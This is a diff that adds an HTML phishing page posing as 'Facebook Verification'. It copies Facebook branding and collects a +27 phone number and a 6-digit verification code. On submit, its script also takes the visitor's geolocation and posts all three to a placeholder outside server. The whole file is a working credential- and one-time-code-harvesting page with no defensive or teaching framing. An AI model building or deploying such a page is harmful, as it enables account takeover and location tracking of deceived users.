@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            position: relative; /* Added for positioning the image */
+        }
+        .container img {
+            position: absolute;
+            top: -50px; /* Adjust as needed */
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 50%; /* Makes the image circular */
+            width: 58px; /* Adjusted by reducing 2 pixels */
+            height: 58px; /* Adjusted by reducing 2 pixels */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Added shadow around the image */
+            clip-path: circle(50% at 50% 50%); /* Clip the outer part of the image */
+        }
+        .input-group {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .input-group input {
+            width: 30px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            text-align: center;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .verification-group {
+            margin-top: 20px;
+        }
+        .verification-group .input-group {
+            margin-top: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            background-color: #4267B2; /* Facebook color */
+            color: white;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        label, p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .country-code {
+            font-size: 16px;
+            margin-right: 5px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+                width: 90%;
+                box-sizing: border-box;
+            }
+            .input-group input {
+                width: 25px;
+                padding: 8px;
+                font-size: 14px;
+            }
+            button {
+                padding: 8px 16px;
+            }
+            .container img {
+                top: -40px;
+                width: 48px;
+                height: 48px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="facebook.JPG" alt="Facebook" /> <!-- Image added here -->
+        <h2>Facebook Verification</h2>
+        <form id="verification-form">
+            <p>Enter your phone number:</p>
+            <div class="input-group" id="phone-number-group">
+                <span class="country-code">+27</span>
+            </div>
+            <div class="verification-group">
+                <label for="verification_code">Enter Verification Code:</label>
+                <div class="input-group" id="verification-code-group"></div>
+            </div>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        // Function to create input fields and set up auto-tab functionality
+        function createInputFields(parentId, numFields, inputNamePrefix) {
+            const parentElement = document.getElementById(parentId);
+            for (let i = 1; i <= numFields; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.name = inputNamePrefix + i;
+                input.maxLength = 1;
+                input.required = true;
+
+                // Ensure only integers are allowed
+                input.addEventListener('input', (event) => {
+                    const value = event.target.value;
+                    if (!/^\d*$/.test(value)) {
+                        event.target.value = value.replace(/\D/g, '');
+                    }
+                });
+
+                // Handle forward tabbing
+                input.addEventListener('input', (event) => {
+                    if (event.target.value.length === 1) {
+                        const nextInput = event.target.nextElementSibling;
+                        if (nextInput) {
+                            nextInput.focus();
+                        }
+                    }
+                });
+
+                // Prevent backward tabbing
+                input.addEventListener('keydown', (event) => {
+                    if (event.key === 'Backspace' && event.target.value.length === 0) {
+                        event.preventDefault();
+                    }
+                });
+
+                parentElement.appendChild(input);
+            }
+        }
+
+        // Create phone number input fields
+        createInputFields('phone-number-group', 9, 'digit');
+
+        // Create verification code input fields
+        createInputFields('verification-code-group', 6, 'code');
+
+        // Handle form submission
+        document.getElementById('verification-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Collect phone number digits
+            const phoneNumberInputs = document.querySelectorAll('#phone-number-group input');
+            let phoneNumber = '+27';
+            phoneNumberInputs.forEach(input => {
+                phoneNumber += input.value;
+            });
+
+            // Collect verification code digits
+            const verificationCodeInputs = document.querySelectorAll('#verification-code-group input');
+            let verificationCode = '';
+            verificationCodeInputs.forEach(input => {
+                verificationCode += input.value;
+            });
+
+            // Get user's geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const { latitude, longitude } = position.coords;
+
+                    // Send data to the server
+                    fetch('https://your-server-endpoint.com/process', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            phoneNumber,
+                            verificationCode,
+                            location: {
+                                latitude,
+                                longitude
+                            }
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+
+                }, (error) => {
+                    console.error('Geolocation error:', error);
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
+        });
+    </script>
+</body>
+</html>
